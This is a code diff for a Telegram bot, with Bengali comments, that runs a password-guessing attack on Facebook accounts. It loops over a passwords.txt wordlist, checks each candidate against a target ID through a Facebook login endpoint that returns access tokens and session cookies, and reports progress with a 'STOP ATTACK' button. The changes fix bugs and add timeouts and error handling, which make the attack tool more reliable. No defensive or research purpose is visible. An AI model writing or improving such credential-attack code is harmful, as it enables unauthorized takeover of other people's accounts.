@@ -1,7 +1,5 @@
 import telebot
 import requests
-import mechanize
-import time
 import os
 from telebot import types
 from flask import Flask
@@ -38,7 +36,7 @@ def check_fb_login(email, password):
             "generate_session_cookies": "1",
             "sig": "3f555f98fb61fcdbf0f44813f82e1aa"
         }
-        response = requests.get(url, params=params)
+        response = requests.get(url, params=params, timeout=10)
         data = response.json()
         if "access_token" in data:
             return "SUCCESS"
@@ -68,11 +66,17 @@ def start_attack(message):
     chat_id = message.chat.id
     loop_control[chat_id] = True
     
+    # এখানে callback_data ব্যবহার করা হয়েছে
     markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🛑 STOP ATTACK", callback_query_data="stop_attack"))
+    markup.add(types.InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack"))
+    
     status_msg = bot.send_message(chat_id, "⚙️ **Initializing Attack...**", parse_mode='Markdown')
     
     try:
+        if not os.path.exists('passwords.txt'):
+            bot.send_message(chat_id, "❌ `passwords.txt` ফাইলটি পাওয়া যায়নি!")
+            return
+
         with open('passwords.txt', 'r') as f:
             all_passwords = f.readlines()
         
@@ -83,16 +87,18 @@ def start_attack(message):
                 return
 
             pwd = pwd.strip()
-            if not pwd:
-                continue
+            if not pwd: continue
 
-            if count % 5 == 0:
-                bot.edit_message_text(
-                    f"🛰 **Working...** `[{count}/{total}]`\n"
-                    f"🎯 **Target:** `{target_id}`\n"
-                    f"🔥 **Testing:** `{pwd}`", 
-                    chat_id, status_msg.message_id, reply_markup=markup, parse_mode='Markdown'
-                )
+            # আপডেট দেয়ার সময় markup (বাটন) পুনরায় পাঠাতে হয়
+            if count % 5 == 0 or count == 1:
+                try:
+                    bot.edit_message_text(
+                        f"🛰 **Working...** `[{count}/{total}]`\n"
+                        f"🎯 **Target:** `{target_id}`\n"
+                        f"🔥 **Testing:** `{pwd}`", 
+                        chat_id, status_msg.message_id, reply_markup=markup, parse_mode='Markdown'
+                    )
+                except: pass
             
             result = check_fb_login(target_id, pwd)
             
@@ -111,10 +117,11 @@ def start_attack(message):
 def stop(call):
     loop_control[call.message.chat.id] = False
     bot.answer_callback_query(call.id, "Stopping the attack...")
+    bot.edit_message_text("🛑 Attack stopping...", call.message.chat.id, call.message.message_id)
 
 if __name__ == "__main__":
     t = Thread(target=run_web)
     t.daemon = True
     t.start()
     bot.polling(none_stop=True)
-                  
+        
